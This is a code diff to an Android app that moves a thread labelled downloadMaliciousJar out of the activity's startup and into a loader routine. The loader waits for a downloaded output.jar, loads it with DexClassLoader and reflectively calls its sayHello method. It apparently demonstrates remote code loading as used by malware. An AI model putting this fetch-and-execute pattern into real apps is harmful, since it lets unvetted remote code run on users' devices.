@@ -30,7 +30,6 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         button1 = findViewById(R.id.button);
         button1.setOnClickListener(this);
         textView1 = findViewById(R.id.textView);
-        downloadMaliciousJar();
 
     }
 
@@ -54,10 +53,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         }
     }
 
-    private void downloadMaliciousJar() {
-        Thread thread = new Thread(new DownloaderRunnable(this.getApplicationContext()));
-        thread.start();
-    }
+
 }
 
 class LoaderCallable implements Callable<String> {
@@ -71,6 +67,11 @@ class LoaderCallable implements Callable<String> {
 
     @Override
     public String call() throws Exception {
+
+        Thread thread = new Thread(new DownloaderRunnable(context));
+        thread.start();
+        thread.join();
+
         DexClassLoader loader = new DexClassLoader(context.getFilesDir().getAbsolutePath().concat("/output.jar"),
                 context.getDir("outdex", Context.MODE_PRIVATE).getAbsolutePath(),
                 null, context.getClassLoader());
@@ -85,4 +86,5 @@ class LoaderCallable implements Callable<String> {
         Method method = beanClass.getMethod("sayHello");
         return (String) method.invoke(beanObj);
     }
+
 }
